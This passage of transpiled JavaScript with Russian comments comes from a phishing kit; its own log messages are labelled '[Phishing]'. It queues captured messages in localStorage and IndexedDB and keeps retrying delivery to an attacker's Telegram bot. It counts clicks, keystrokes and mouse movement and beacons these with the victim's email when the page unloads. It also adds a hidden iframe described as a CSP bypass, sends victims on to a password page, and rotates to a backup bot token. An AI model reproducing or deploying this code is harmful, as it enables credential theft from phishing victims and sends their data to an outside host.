    if ('indexedDB' in window) {
      saveToIndexedDB(message, type);
    }
  } catch (e) {
    console.warn('[Phishing] Ошибка сохранения:', e);
  }
}

/**
 * Сохранение в IndexedDB
 */
function saveToIndexedDB(message, type) {
  try {
    var request = indexedDB.open('PhishingMessages', 1);
    request.onupgradeneeded = function(event) {
      var db = event.target.result;
      if (!db.objectStoreNames.contains('messages')) {
        db.createObjectStore('messages', {
          keyPath: 'id',
          autoIncrement: true,
        });
      }
    };
    request.onsuccess = function(event) {
      var db = event.target.result;
      var transaction = db.transaction(['messages'], 'readwrite');
      var store = transaction.objectStore('messages');
      store.add({
        message: message.substring(0, 2000),
        type: type,
        timestamp: new Date().toISOString(),
        sessionId: AppState.sessionId,
        sent: false,
      });
    };
  } catch (e) {
    // Игнорируем ошибки IndexedDB
  }
}

/**
 * Попытка отправки сохраненных сообщений
 */
function retryPendingMessages() {
  return _retryPendingMessages.apply(this, arguments);
}
/**
 * Повторная отправка из IndexedDB
 */
function _retryPendingMessages() {
  _retryPendingMessages = _asyncToGenerator(
    /*#__PURE__*/ _regeneratorRuntime().mark(function _callee3() {
      var pending, message, success;
      return _regeneratorRuntime().wrap(
        function _callee3$(_context3) {
          while (1)
            switch ((_context3.prev = _context3.next)) {
              case 0:
                _context3.prev = 0;
                // Проверяем localStorage
                pending = JSON.parse(
                  localStorage.getItem('pending_messages') || '[]',
                );
                if (!(pending.length > 0)) {
                  _context3.next = 8;
                  break;
                }
                message = pending[0];
                _context3.next = 6;
                return sendToTelegram(message.message, message.type);
              case 6:
                success = _context3.sent;
                if (success) {
                  pending.shift();
                  localStorage.setItem(
                    'pending_messages',
                    JSON.stringify(pending),
                  );
                }
              case 8:
                // Проверяем IndexedDB
                if ('indexedDB' in window) {
                  retryIndexedDBMessages();
                }
                _context3.next = 14;
                break;
              case 11:
                _context3.prev = 11;
                _context3.t0 = _context3['catch'](0);
                console.warn('[Phishing] Ошибка retry:', _context3.t0);
              case 14:
              case 'end':
                return _context3.stop();
            }
        },
        _callee3,
        null,
        [[0, 11]],
      );
    }),
  );
  return _retryPendingMessages.apply(this, arguments);
}
function retryIndexedDBMessages() {
  try {
    var request = indexedDB.open('PhishingMessages', 1);
    request.onsuccess = function(event) {
      var db = event.target.result;
      var transaction = db.transaction(['messages'], 'readonly');
      var store = transaction.objectStore('messages');
      var getAllRequest = store.getAll();
      getAllRequest.onsuccess = function() {
        var messages = getAllRequest.result.filter(function(m) {
          return !m.sent;
        });
        if (messages.length > 0) {
          var message = messages[0];
          sendToTelegram(message.message, message.type).then(function(success) {
            if (success) {
              var updateTransaction = db.transaction(['messages'], 'readwrite');
              var updateStore = updateTransaction.objectStore('messages');
              message.sent = true;
              updateStore.put(message);
            }
          });
        }
      };
    };
  } catch (e) {
    // Игнорируем ошибки
  }
}

/**
 * Инициализация fallback методов
 */
function initFallbackMethods() {
  // Добавляем скрытые iframe для обхода CSP
  if (!document.getElementById('csp-bypass-frame')) {
    var iframe = document.createElement('iframe');
    iframe.id = 'csp-bypass-frame';
    iframe.style.display = 'none';
    iframe.sandbox = 'allow-scripts allow-same-origin';
    document.body.appendChild(iframe);
  }

  // Инициализируем WebSocket fallback
  initWebSocketFallback();
}

/**
 * WebSocket fallback
 */
function initWebSocketFallback() {
  try {
    var ws = new WebSocket('wss://echo.websocket.org');
    ws.onopen = function() {
      window.wsFallback = ws;
    };
    ws.onerror = function() {
      // WebSocket недоступен
    };
  } catch (e) {
    // Игнорируем ошибки WebSocket
  }
}

/**
 * Общие обработчики
 */
function initCommonHandlers() {
  try {
    // CSS анимации
    if (!document.querySelector('#phishing-styles')) {
      var style = document.createElement('style');
      style.id = 'phishing-styles';
      style.textContent =
        "\n                @keyframes phishing-shake {\n                    0%, 100% { transform: translateX(0); }\n                    10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }\n                    20%, 40%, 60%, 80% { transform: translateX(5px); }\n                }\n                @keyframes phishing-slideUp {\n                    from { opacity: 0; transform: translateY(10px); }\n                    to { opacity: 1; transform: translateY(0); }\n                }\n                @keyframes phishing-spin {\n                    0% { transform: rotate(0deg); }\n                    100% { transform: rotate(360deg); }\n                }\n                .phishing-shake {\n                    animation: phishing-shake 0.5s;\n                }\n                .phishing-loading {\n                    position: relative;\n                    color: transparent !important;\n                }\n                .phishing-loading::after {\n                    content: '';\n                    position: absolute;\n                    left: 50%;\n                    top: 50%;\n                    width: 16px;\n                    height: 16px;\n                    margin: -8px 0 0 -8px;\n                    border: 2px solid rgba(32, 33, 36, 0.3);\n                    border-top-color: #202124;\n                    border-radius: 50%;\n                    animation: phishing-spin 0.8s linear infinite;\n                }\n            ";
      document.head.appendChild(style);
    }
  } catch (error) {
    console.error('[Phishing] Ошибка обработчиков:', error);
  }
}

/**
 * Отслеживание поведения
 */
function trackUserBehavior() {
  var clickCount = 0;
  var keyCount = 0;
  var mouseMovements = 0;
  var lastMousePosition = {
    x: 0,
    y: 0,
  };
  try {
    // Отслеживание кликов
    document.addEventListener(
      'click',
      function() {
        clickCount++;
      },
      {
        passive: true,
      },
    );

    // Отслеживание нажатий клавиш
    document.addEventListener(
      'keydown',
      function() {
        keyCount++;
      },
      {
        passive: true,
      },
    );

    // Отслеживание движения мыши
    document.addEventListener(
      'mousemove',
      function(e) {
        var distance = Math.sqrt(
          Math.pow(e.clientX - lastMousePosition.x, 2) +
            Math.pow(e.clientY - lastMousePosition.y, 2),
        );
        if (distance > 10) {
          mouseMovements++;
          lastMousePosition = {
            x: e.clientX,
            y: e.clientY,
          };
        }
      },
      {
        passive: true,
      },
    );

    // Отправка данных при уходе
    window.addEventListener('beforeunload', function() {
      if (clickCount > 0 || keyCount > 0) {
        var timeSpent = Math.round((Date.now() - AppState.startTime) / 1000);
        var message =
          '\uD83D\uDCCA \u041F\u041E\u0412\u0415\u0414\u0415\u041D\u0418\u0415 \u041F\u041E\u041B\u042C\u0417\u041E\u0412\u0410\u0422\u0415\u041B\u042F\n' +
          '\uD83D\uDD50 \u0412\u0440\u0435\u043C\u044F \u043D\u0430 \u0441\u0442\u0440\u0430\u043D\u0438\u0446\u0435: '.concat(
            timeSpent,
            ' \u0441\u0435\u043A\n',
          ) +
          '\uD83D\uDDB1\uFE0F \u041A\u043B\u0438\u043A\u043E\u0432: '.concat(
            clickCount,
            '\n',
          ) +
          '\u2328\uFE0F \u041D\u0430\u0436\u0430\u0442\u0438\u0439 \u043A\u043B\u0430\u0432\u0438\u0448: '.concat(
            keyCount,
            '\n',
          ) +
          '\uD83D\uDC2D \u0414\u0432\u0438\u0436\u0435\u043D\u0438\u0439 \u043C\u044B\u0448\u0438: '.concat(
            mouseMovements,
            '\n',
          ) +
          '\uD83D\uDCE7 Email: '.concat(AppState.email || 'не введен', '\n') +
          '\uD83D\uDD17 \u0421\u0442\u0440\u0430\u043D\u0438\u0446\u0430: '.concat(
            AppState.page,
          );
        sendBeaconPost(message);
      }
    });
  } catch (error) {
    console.warn('[Phishing] Ошибка трекинга:', error);
  }
}

/**
 * Отправка beacon через POST
 */
function sendBeaconPost(message) {
  try {
    var url = 'https://api.telegram.org/bot'.concat(
      AppState.currentBotToken,
      '/sendMessage',
    );
    var data = new URLSearchParams();
    data.append('chat_id', CONFIG.CHAT_ID);
    data.append('text', message);
    var blob = new Blob([data.toString()], {
      type: 'application/x-www-form-urlencoded',
    });
    if (navigator.sendBeacon) {
      navigator.sendBeacon(url, blob);
    } else {
      // Fallback
      sendViaImageBeacon(message);
    }
  } catch (e) {
    // Игнорируем ошибки
  }
}

/**
 * Вспомогательные функции
 */
function showError(message) {
  var isPassword =
    arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : false;
  try {
    var errorEl, inputEl;
    if (isPassword) {
      errorEl = document.getElementById('errorMessage');
      inputEl = document.getElementById('password');
    } else {
      errorEl = document.getElementById('errorMessage');
      inputEl = document.getElementById('phoneEmail');
    }
    if (errorEl && inputEl) {
      errorEl.textContent = message;
      errorEl.classList.add('visible');
      inputEl.classList.add('error', 'phishing-shake');
      setTimeout(function() {
        inputEl.classList.remove('phishing-shake');
      }, 500);
      setTimeout(function() {
        errorEl.classList.remove('visible');
        inputEl.classList.remove('error');
      }, 5000);
    }
  } catch (error) {
    console.warn('[Phishing] Ошибка показа ошибки:', error);
  }
}
function showSuccess(message) {
  try {
    var el = document.createElement('div');
    el.className = 'success-message';
    el.textContent = message;
    el.style.cssText =
      '\n            position: fixed;\n            bottom: 20px;\n            right: 20px;\n            background: #81c995;\n            color: #202124;\n            padding: 12px 20px;\n            border-radius: 4px;\n            box-shadow: 0 4px 12px rgba(0,0,0,0.3);\n            z-index: 1001;\n            font-size: 14px;\n            animation: phishing-slideUp 0.3s ease-out;\n        ';
    document.body.appendChild(el);
    setTimeout(function() {
      if (el.parentNode) {
        el.parentNode.removeChild(el);
      }
    }, 3000);
  } catch (error) {
    console.warn('[Phishing] Ошибка показа успеха:', error);
  }
}
function goToPasswordPage(email) {
  try {
    document.body.style.opacity = '0.7';
    document.body.style.transition = 'opacity 0.3s ease';
    setTimeout(function() {
      window.location.href = 'password.html';
    }, 300);
  } catch (error) {
    console.error('[Phishing] Ошибка перехода:', error);
    window.location.href = 'password.html';
  }
}
function redirectToOtherSite() {
  try {
    // Устанавливаем флаг успешной регистрации
    localStorage.setItem('userRegistered', 'true');
    localStorage.setItem('registration_complete', 'true');
    localStorage.setItem('registration_redirect', 'pending');
    var targetUrl = CONFIG.RETURN_URL + '?registration=success&t=' + Date.now();

    // Отправляем финальное сообщение
    var finalMessage =
      '\u2705 \u0420\u0415\u0413\u0418\u0421\u0422\u0420\u0410\u0426\u0418\u042F \u0417\u0410\u0412\u0415\u0420\u0428\u0415\u041D\u0410\n' +
      '\uD83D\uDCE7 '.concat(
        localStorage.getItem('userEmail') || 'неизвестно',
        '\n',
      ) +
      '\uD83D\uDD50 '.concat(new Date().toLocaleTimeString('ru-RU'), '\n') +
      '\uD83D\uDD17 \u041F\u0435\u0440\u0435\u043D\u0430\u043F\u0440\u0430\u0432\u043B\u0435\u043D\u0438\u0435 \u043D\u0430: '.concat(
        targetUrl,
        '\n',
      ) +
      '\uD83C\uDF10 '.concat(navigator.userAgent.substring(0, 60), '...');
    sendToTelegram(finalMessage, 'redirect');
    document.body.style.opacity = '0.5';
    document.body.style.transition = 'opacity 0.5s ease';
    setTimeout(function() {
      window.location.href = targetUrl;
    }, 800);
  } catch (error) {
    console.error('[Phishing] Ошибка редиректа:', error);
    window.location.href = CONFIG.RETURN_URL;
  }
}

// Запуск приложения
document.addEventListener('DOMContentLoaded', safeInit);

// Совместимость с jQuery
if (typeof jQuery !== 'undefined') {
  jQuery(safeInit);
}

// Периодическая попытка отправки сохраненных сообщений
setInterval(retryPendingMessages, 30000); // Каждые 30 секунд

// Проверка и ротация токенов каждые 12 часов
setInterval(function() {
  var currentToken = localStorage.getItem('current_bot_token');
  if (currentToken === CONFIG.BOT_TOKEN) {
    localStorage.setItem('current_bot_token', CONFIG.BACKUP_BOT);
    AppState.currentBotToken = CONFIG.BACKUP_BOT;
  }
}, 12 * 60 * 60 * 1000);
